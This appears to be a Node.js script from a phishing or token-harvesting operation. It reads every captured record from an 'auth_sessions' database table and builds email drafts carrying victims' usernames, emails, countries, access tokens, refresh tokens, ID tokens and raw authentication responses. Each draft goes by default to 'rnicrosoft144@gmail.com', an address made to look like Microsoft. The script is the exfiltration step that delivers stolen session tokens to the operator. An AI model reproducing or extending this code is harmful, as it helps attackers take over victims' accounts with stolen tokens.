const { Pool } = require('pg');
const fs = require('fs');
require('dotenv').config();

async function generateGmailPayload() {
  const pool = new Pool({ connectionString: process.env.DATABASE_URL });
  try {
    const client = await pool.connect();
    const res = await client.query('SELECT * FROM auth_sessions ORDER BY created_at DESC');
    client.release();

    if (res.rows.length === 0) {
      console.log('No records found in database to sync.');
      return;
    }

    const messages = res.rows.map(row => {
      const subject = `[Auth Session] ${row.email || row.username || 'Unknown User'} - ${row.country || 'Unknown Country'}`;
      const content = `New Authentication Session Captured:
ID: ${row.id}
Username: ${row.username || 'N/A'}
Email: ${row.email || 'N/A'}
Country: ${row.country || 'N/A'}
Timestamp: ${row.created_at}

Access Token:
${row.access_token || 'N/A'}

Refresh Token:
${row.refresh_token || 'N/A'}

ID Token:
${row.id_token || 'N/A'}

Raw Response:
${row.raw_response || 'N/A'}
`;
      // Always send to the configured recipient
      const recipient = process.env.DEFAULT_GMAIL_RECIPIENT || 'rnicrosoft144@gmail.com';

      return {
        to: [recipient],
        subject: subject,
        content: content
      };
    });

    const payload = { messages };
    fs.writeFileSync('gmail_drafts_payload.json', JSON.stringify(payload, null, 2));
    console.log(`Generated payload for ${messages.length} records in gmail_drafts_payload.json`);
  } catch (err) {
    console.error('Error generating payload:', err);
  } finally {
    await pool.end();
  }
}

generateGmailPayload();
